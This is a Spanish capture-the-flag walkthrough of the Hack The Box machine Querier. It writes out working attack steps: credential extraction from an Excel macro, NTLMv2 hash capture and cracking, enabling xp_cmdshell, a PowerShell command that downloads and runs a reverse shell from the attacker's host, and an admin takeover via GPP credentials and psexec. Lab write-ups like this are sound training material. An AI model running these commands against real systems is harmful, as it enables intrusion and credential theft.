---
title: Hack The Box Querier
author: k4miyo
date: 2021-09-17
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Windows]
tags: [Windows, SQL, Powershell, Injection]
ping: true
---

## Querier
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.125.

```bash
❯ ping -c 1 10.10.10.125
PING 10.10.10.125 (10.10.10.125) 56(84) bytes of data.
64 bytes from 10.10.10.125: icmp_seq=1 ttl=127 time=143 ms

--- 10.10.10.125 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 143.424/143.424/143.424/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.125 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-17 13:01 CDT
Initiating SYN Stealth Scan at 13:01
Scanning 10.10.10.125 [65535 ports]
Discovered open port 139/tcp on 10.10.10.125
Discovered open port 445/tcp on 10.10.10.125
Discovered open port 135/tcp on 10.10.10.125
Discovered open port 49666/tcp on 10.10.10.125
Discovered open port 49665/tcp on 10.10.10.125
Discovered open port 49668/tcp on 10.10.10.125
Discovered open port 49664/tcp on 10.10.10.125
Discovered open port 49669/tcp on 10.10.10.125
Discovered open port 49667/tcp on 10.10.10.125
Discovered open port 47001/tcp on 10.10.10.125
Discovered open port 5985/tcp on 10.10.10.125
Discovered open port 1433/tcp on 10.10.10.125
Discovered open port 49670/tcp on 10.10.10.125
Discovered open port 49671/tcp on 10.10.10.125
Completed SYN Stealth Scan at 13:02, 23.61s elapsed (65535 total ports)
Nmap scan report for 10.10.10.125
Host is up, received user-set (0.22s latency).
Scanned at 2021-09-17 13:01:43 CDT for 24s
Not shown: 62465 closed tcp ports (reset), 3056 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
1433/tcp  open  ms-sql-s     syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127
49671/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.92 seconds
           Raw packets sent: 115468 (5.081MB) | Rcvd: 76061 (3.043MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.125
   5   │     [*] Open ports: 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.10.10.125 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-17 13:03 CDT
Nmap scan report for 10.10.10.125
Host is up (0.14s latency).    
                                                                                                                                 
PORT      STATE SERVICE       VERSION                                                                                            
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?                                                                                                    
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-09-17T18:00:36            
|_Not valid after:  2051-09-17T18:00:36            
| ms-sql-ntlm-info:                                             
|   Target_Name: HTB                                            
|   NetBIOS_Domain_Name: HTB                                    
|   NetBIOS_Computer_Name: QUERIER                 
|   DNS_Domain_Name: HTB.LOCAL                                  
|   DNS_Computer_Name: QUERIER.HTB.LOCAL           
|   DNS_Tree_Name: HTB.LOCAL                                    
|_  Product_Version: 10.0.17763
|_ssl-date: 2021-09-17T18:09:27+00:00; +4m45s from scanner time. 
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                                         
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC    
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
                                
Host script results:
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: 4m44s, deviation: 0s, median: 4m43s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-17T18:09:22
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.70 seconds
```

Vamos a empezar con el análisis. Vemos el puerto 445 abierto, por lo que podríamos intentar conectarnos haciendo uso de una *null session*:

```bash
❯ smbclient -L 10.10.10.125 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
SMB1 disabled -- no workgroup available
```

En el resultado, podemos ver un recurso denominado `Reports`, por lo que ahora nos conectaremos haciendo uso de `smbclient` con una *null session* para ver si el directorio tiene contenido:

```bash
❯ smbclient //10.10.10.125/Reports -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 28 17:23:48 2019
  ..                                  D        0  Mon Jan 28 17:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 16:21:34 2019

                6469119 blocks of size 4096. 1614769 blocks available
smb: \>
```

Observamos el archivo *Currency Volume Report.xlsm*, por lo que lo traemos a nuestra máquina de atacante para ver su contenido.

```bash
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (16.4 KiloBytes/sec) (average 16.4 KiloBytes/sec)
smb: \>
```

Para efectos prácticos, renombramos el archivo a *document.xlsm*. Obtenemos datos del documento antes de abrirlo.

```bash
❯ file document.xlsm
document.xlsm: Microsoft Excel 2007+
❯ exiftool document.xlsm
ExifTool Version Number         : 12.16
File Name                       : document.xlsm
Directory                       : .
File Size                       : 12 KiB
File Modification Date/Time     : 2021:09:17 13:27:24-05:00
File Access Date/Time           : 2021:09:17 13:27:24-05:00
File Inode Change Date/Time     : 2021:09:17 13:28:04-05:00
File Permissions                : rw-r--r--
File Type                       : XLSM
File Type Extension             : xlsm
MIME Type                       : application/vnd.ms-excel.sheet.macroEnabled
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x513599ac
Zip Compressed Size             : 367
Zip Uncompressed Size           : 1087
Zip File Name                   : [Content_Types].xml
Creator                         : Luis
Last Modified By                : Luis
Create Date                     : 2019:01:21 20:38:56Z
Modify Date                     : 2019:01:27 22:21:34Z
Application                     : Microsoft Excel
Doc Security                    : None
Scale Crop                      : No
Heading Pairs                   : Worksheets, 1
Titles Of Parts                 : Currency Volume
Company                         : 
Links Up To Date                : No
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0300
```

Vemos que se trata de un archivo de **Microsoft Excel 2007** creado por el usuario **Luis** y que el valor de **MIME Type** es `application/vnd.ms-excel.sheet.macroEnabled`, lo que nos indica que el archivo presenta una macro (también lo podriamos ver por la extensión del archivo). Para la visualización del contenido, podríamos utilizar *Open Office*; pero para no pelearnos con temas de proporciones o cosas random, nos instalaremos [WPS Office](https://linux.wps.com/).

![""](/assets/images/htb-querier/querier_document.jpg)

Vemos que no presenta contenido el archivo; sin embargo, sabemos que presenta una macro, la cual podríamos tratar de visualizarla con **WPS Office**. Para este caso, vamos a utilizar la siguiente herramienta:

- [Oletools](https://github.com/decalage2/oletools)

```bash
❯ git clone https://github.com/decalage2/oletools
Clonando en 'oletools'...
remote: Enumerating objects: 6356, done.
remote: Counting objects: 100% (239/239), done.
remote: Compressing objects: 100% (169/169), done.
remote: Total 6356 (delta 156), reused 139 (delta 70), pack-reused 6117
Recibiendo objetos: 100% (6356/6356), 4.80 MiB | 5.28 MiB/s, listo.
Resolviendo deltas: 100% (4365/4365), listo.
```

Ingresamos al directorio e instalamos con el siguienten comando:

```bash
❯ python3 setup.py install
```

Ahora ejecutamos el siguiente comando pasandole como parámetro el nombre del archivo que queremos visualizar:

```bash
❯ olevba document.xlsm                                          
olevba 0.60 on Python 3.9.2 - http://decalage.info/python/oletools
===============================================================================
FILE: document.xlsm
Type: OpenXML        
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                                                                                                                 ' macro to pull data for client volume reports
'                          
' further testing required

Private Sub Connect()           

Dim conn As ADODB.Connection                                    
Dim rs As ADODB.Recordset
                                                                
Set conn = New ADODB.Connection                                 
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc
$c6"      
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then
                                                                                                                                 
  ' MsgBox "connection successful"
                                                                
  'Set rs = conn.Execute("SELECT * @@version;")                                                                                  
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs                                                                                     
  rs.Close                                                                                                                       
                                                                                                                                 
End If                                                                                                                           
                                                                                                                                 
End Sub                                                                                                                          
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls                                                                                                             
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

En la información reportada, vemos que la macro establece una conexión con una base de datos, por lo que nos guardamos las credenciales de acceso. Para validar si las credenciales son válidas, podemos intentar establecer una conexión por *smb* a través de la utilidad [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation):

```bash
❯ crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6'
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [-] HTB.LOCAL\reporting:PcwTWTHRwryjc$c6 STATUS_NO_LOGON_SERVERS 
```

Vemos que nos reporta un **[-]**, pero lo maneja como dominio de **HTB.LOCAL**, vamos a probar si el usario existe pero a nivel del sistema y no de dominio:

```bash
❯ crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\reporting:PcwTWTHRwryjc$c6
```

Ahora si vemos un **[+]**, lo que significa que el usuario existe a nivel de sistema. Una vez que validamos las credenciales, podemos conectarnos al servicio de *Microsoft SQL Server*:

```bash
❯ mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL>
```

Vamos a probar si podemos ejecutar algunos comandos:

```bash
SQL> xp_cmdshell "whoami"
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL> sp_configure "show advanced", 1
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
SQL>
```

Vemos que no podemos ejecutar comandos a nivel de sistema ni tampoco tenemos privilegios para alterar la configuración que nos pueda permitir habilitar la ejecución de comandos. Por lo tanto, lo que nos queda sería tratar de acceder a un recurso compartido por red mediante el uso del comando `xp_dirtree`. Asi que, nos compartimos un recurso desde nuestra máquina de atacante:

```bash
SQL> xp_dirtree "\\10.10.14.2\smbFolder\test"
subdirectory                                                                                                                                                                                                                                                            depth   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   

SQL>
```

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.125,49694)
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
[*] User QUERIER\mssql-svc authenticated successfully
[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:8bd4caf70224f8aebc7c79404049305d:0101000000000000800c9068ffabd701410f4a3dd8d7221300000000010010005a0077007100570073004c004b007900030010005a0077007100570073004c004b007900020010004100500068004f0064004c0050007500040010004100500068004f0064004c005000750007000800800c9068ffabd70106000400020000000800300030000000000000000000000000300000b58fdd1714e6ed624db2b7fbba1433facc61ba9747ccbeaf3c5b2e7f2aa100d40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003200000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] AUTHENTICATE_MESSAGE (\,QUERIER)
[*] User QUERIER\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:smbFolder)
[*] Closing down connection (10.10.10.125,49694)
[*] Remaining connections []
```

En nuestra máquina de atacante podemos un hash NTLMv2 el cual **NO** nos service para hacer *pass the hash*; pero podriamos tratar de crackearlo para ver la contraseña en texto claro. Por lo que creamos un archivo llamado *hash* en el cual pegamos el hash de NTLMv2 que vemos y ocupamos la herramienta `john`. En algunos casos es posible que `john` no pueda crackear el hash, en caso de que suceda, obtener un nuevo hash y tratar de crackearlo o hacer uso de [Responder](https://github.com/SpiderLabs/Responder).

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:30 DONE (2021-09-17 15:10) 0.03235g/s 289819p/s 289819c/s 289819C/s corpron50..corporal40
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Tenemos unas nuevas credenciales, por lo que pasamos a validarlas con `crackmapexec`:

```bash
❯ crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\mssql-svc:corporate568
```

Ahora, intentamos conectarnos a *Microsoft SQL Server* con las nuevas credenciales y validamos si podemos ejecutar comandos a nivel de sistema:

```bash
❯ mssqlclient.py WORKGROUP/mssql-svc@10.10.10.125 -windows-auth
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> xp_cmdshell "whoami"
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL> sp_configure "xp_cmdshell", 1
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
SQL> sp_configure "show advanced", 1
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure
SQL> sp_configure "xp_cmdshell", 1
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

querier\mssql-svc                                                                  

NULL                                                                               

SQL>
```

Explicamos un poco los comandos ejecutados. Primero tratamos de ejecutar un comando a nivel de sistema con `xp_cmdshell`; sin embargo nos manda un error, por lo tanto tratamos de cambiar el valor de `xp_cmdshell` de 0 a 1 con `sp_configure "xp_cmdshell, 1"`, pero otra vez nos sale otro error. A este punto cambiamos el valor de `show advanced` de 0 a 1, lo cual nos lo permite y aplicamos una reconfiguración para que se apliquen los cambios con `reconfigure`. Ahora nos queda cambiar el valor de `xp_cmdshell` de 0 a 1, aplicamos un `reconfigure` y ya podemos ejecutar comando a nivel de sistema.

Vamos a entablarnos una reverse shell, copiamos el archivo *Invoke-PowerShellTcp.ps1* a nuestro directorio de trabajo:

```bash
❯ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
```

Abrimos el archivo y al final agregamos la siguiente linea:

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443
```

Nos compartimos un servidor HTTP con python, nos ponemos en escucha a través del puerto 443 y procedemos a ejecutar lo siguiente en la máquina víctima:

```bash
SQL> xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.2/PS.ps1\")"
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.125 - - [17/Sep/2021 15:50:09] "GET /PS.ps1 HTTP/1.1" 200 -
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.125] 49702
Windows PowerShell running as user mssql-svc on QUERIER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
querier\mssql-svc
PS C:\Windows\system32>
```

Antes de hacer cualquier cosa, validamos si nos encontramos en un sistema de 64 bits y en un proceso igual:

```bash
[Environment]::Is64BitOperatingSystem
True
[Environment]::Is64BitProcess
True
PS C:\Windows\system32>
```

A este punto ya poder visualizar la flag (user.txt). Ahora solo falta escalar privilegios, por lo que empezamos a enumerar un poco el sistema.

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\Users\mssql-svc\Desktop>
```

Observamos que tenemos el privilegio **SeImpersonatePrivilege** habilitado, por lo que ya sabemos tirar **Juicy Potato**; pero para cambiar un poco, vamos a descargar la siguiente utilidad para ver otra forma de escalar privilegios:

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

```bash
❯ git clone https://github.com/PowerShellMafia/PowerSploit
Clonando en 'PowerSploit'...
remote: Enumerating objects: 3086, done.
remote: Total 3086 (delta 0), reused 0 (delta 0), pack-reused 3086
Recibiendo objetos: 100% (3086/3086), 10.47 MiB | 7.17 MiB/s, listo.
Resolviendo deltas: 100% (1809/1809), listo.
❯ cd PowerSploit/Privesc/
❯ ll
.rw-r--r-- root root  26 KB Fri Sep 17 16:05:06 2021  Get-System.ps1
.rw-r--r-- root root 586 KB Fri Sep 17 16:05:06 2021  PowerUp.ps1
.rw-r--r-- root root 1.6 KB Fri Sep 17 16:05:06 2021  Privesc.psd1
.rw-r--r-- root root  67 B  Fri Sep 17 16:05:06 2021  Privesc.psm1
.rw-r--r-- root root 4.5 KB Fri Sep 17 16:05:06 2021  README.md
```

Abrimos el archivo `PowerUp.ps1` y al final agregamos la siguiente linea:

```bash
Invoke-AllChecks
```

Nos compartimos un servidor HTTP con python y procedemos a descargar el archivo a la máquina víctima:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.125 - - [17/Sep/2021 16:11:59] "GET /PowerUp.ps1 HTTP/1.1" 200 -
```

```bash
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.2/PowerUp.ps1")                                               [4/4]
                                
                                
Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2512
ProcessId   : 1108    
Name        : 1108                                              
Check       : Process Token Privileges
                                                                
ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem                                     
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True                                                                                                             
Name          : UsoSvc                                          
Check         : Modifiable Services                                                                                              
                                                                                                                                 
ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc  
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}                                         
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks       
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
                                                                
Changed   : {2019-01-28 23:12:48}          
UserNames : {Administrator}                                                                                                      
NewName   : [BLANK]         
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

De los resultados observamos, vemos diferentes formas de escalar privilegios, *SeImpersonatePrivilege*, *UsoSvc*, *HijackDll* y tambien vemos las credenciales del usuarios **Administrator**.  Si no sabemos como escalar privilegios, podemos ir al siguiente link:

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

Como tenemos credenciales, podemos probarlas con `crackmapexec`:

```bash
❯ crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
```

Observamos que nos pone un `Pwn3d!`, por lo tanto podemos conectarnos a la máquina con `psexec.py`:

```bash
❯ psexec.py WORKGROUP/Administrator@10.10.10.125
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file svpJgbpv.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service vqjK on 10.10.10.125.....
[*] Starting service vqjK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

Ya somos administradores de la máquina y podemos visualizar la flag (root.txt).
